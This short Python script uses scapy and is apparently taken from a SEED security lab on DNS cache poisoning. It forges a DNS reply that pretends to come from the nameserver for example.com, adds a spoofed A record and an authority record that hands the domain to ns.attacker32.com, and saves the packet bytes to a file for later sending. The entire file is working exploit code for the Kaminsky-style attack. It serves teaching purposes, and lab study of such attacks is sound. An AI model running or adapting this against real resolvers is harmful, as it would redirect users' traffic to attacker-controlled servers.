#!/usr/bin/python3
from scapy.all import *

# based on SEED book code
targetName = 'twysw.example.com'
targetDomain = 'example.com'

NS_ip = '199.43.133.53'
local_DNS_ip = '10.9.0.53'
spoofed_ip = '1.2.3.4'

# reply pkt from target domain NSs to the local DNS server
IPpkt = IP(src=NS_ip, dst=local_DNS_ip, chksum=0)
UDPpkt = UDP(sport=53, dport=33333, chksum=0)

# Question section
Qdsec  = DNSQR(qname=targetName)

# Answer section, any IPs(rdata) are fine
Anssec = DNSRR(rrname=targetName, type='A',
               rdata=spoofed_ip, ttl=259200)

# Authority section (the main goal of the attack)               
NSsec  = DNSRR(rrname=targetDomain, type='NS',
               rdata='ns.attacker32.com', ttl=259200)

DNSpkt = DNS(id=0xAAAA, aa=1,ra=0, rd=0, cd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)

Replypkt = IPpkt/UDPpkt/DNSpkt

with open('ip_resp.bin', 'wb') as f:
  f.write(bytes(Replypkt))
  Replypkt.show()
